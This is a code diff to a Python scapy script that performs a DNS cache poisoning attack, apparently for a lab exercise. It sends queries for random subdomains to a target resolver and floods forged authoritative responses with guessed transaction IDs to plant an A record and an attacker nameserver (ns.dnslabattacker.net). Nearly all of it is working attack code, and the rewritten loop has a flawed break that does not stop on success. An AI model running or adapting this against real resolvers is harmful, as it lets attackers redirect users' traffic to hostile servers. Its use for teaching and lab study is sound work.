@@ -26,8 +26,6 @@ spoof_addr = "1.2.3.4"
 spoof_ns = "ns.dnslabattacker.net"
 spoof_domain = "example.com"
 
-ttl_value = 90000
-
 '''
 Generates random strings of length 10.
 '''
@@ -46,38 +44,46 @@ Sends a UDP packet.
 def sendPacket(sock, packet, ip, port):
     sock.sendto(str(packet), (ip, port))
 
-'''
-Example code that sends a DNS query using scapy.
-'''
 def exampleSendDNSQuery():
-    while True:
-        spoof_sub_domain = getRandomSubDomain() + '.' + spoof_domain
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-        dnsPacket = DNS(rd=1, qd=DNSQR(qname=spoof_sub_domain))
-        sendPacket(sock, dnsPacket, dns_addr, dns_port)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    # Fixed to use dns_addr instead of my_ip
+    random_subdomain = getRandomSubDomain() + ".example.com"
+    dnsPacket = DNS(rd=1, qd=DNSQR(qname=random_subdomain))
+    sendPacket(sock, dnsPacket, dns_addr, dns_port)  # Corrected to use dns_addr and dns_port
+    return random_subdomain, sock
 
-        #spoof DNS
-        dns_rsps = DNS(qr=1, aa=1, qdcount=1, ancount=1, nscount=1, arcount=0,
-                    qd=DNSQR(qname=spoof_sub_domain),
-                    an=DNSRR(rrname=spoof_sub_domain, type='A', rdata=spoof_addr, ttl=ttl_value),
-                    ns=DNSRR(rrname=spoof_domain, type='NS', rdata=spoof_ns, ttl=ttl_value))
-        dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-        for _ in range(125):
-            dns_rsps.getlayer(DNS).id = getRandomTXID()
-            print(dns_rsps.getlayer(DNS).id)
-            sendPacket(dns_sock, dns_rsps, dns_addr, my_query_port) # send fake response to BIND's query_port
+def spoof_DNS(spoof_domain):
+    dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Initialization of dns_sock
+    for i in range(100):
+        ttl_value = 86400
+        dns_answer = DNSRR(rrname=spoof_domain, type='A', rdata=spoof_addr, ttl=ttl_value)
+        dns_ns = DNSRR(rrname=spoof_domain, type='NS', rdata=spoof_ns, ttl=ttl_value)
 
-        dns_sock.close()
-
-        response = sock.recv(4096)
-        response = DNS(response)
-        print "\n***** Packet Received from Remote Server *****"
-        print response.show()
-        print "***** End of Remote Server Packet *****\n"
-        if response[DNS].an and response[DNS].an.rdata == spoof_addr:
-            print("Attacked")
-            sock.close()
-            break
+        # Constructing DNS response with a random transaction ID
+        dns_response = DNS(
+            id=getRandomTXID(),  # Correctly setting the transaction ID
+            qr=1, 
+            aa=1,  
+            qdcount=1,  
+            ancount=1,  
+            nscount=1, 
+            arcount=0, 
+            qd=DNSQR(qname=spoof_domain, qtype='A'), 
+            an=dns_answer, 
+            ns=dns_ns 
+        )
+        sendPacket(dns_sock, dns_response, dns_addr, my_query_port)
+    dns_sock.close()
 
 if __name__ == '__main__':
-    exampleSendDNSQuery()
+    while True:
+        spoof_domain, sock = exampleSendDNSQuery()
+        spoof_DNS(spoof_domain)
+        response_data, _ = sock.recvfrom(4096)
+        response = DNS(response_data)
+        if response and response.haslayer(DNS) and response[DNS].ancount > 0:
+            for i in range(response[DNS].ancount):
+                if response[DNS].an[i].rdata == spoof_addr and response[DNS].ns[i].rdata == spoof_ns:
+                    print("Successfully spoofed DNS response")
+                    sock.close()
+                    break
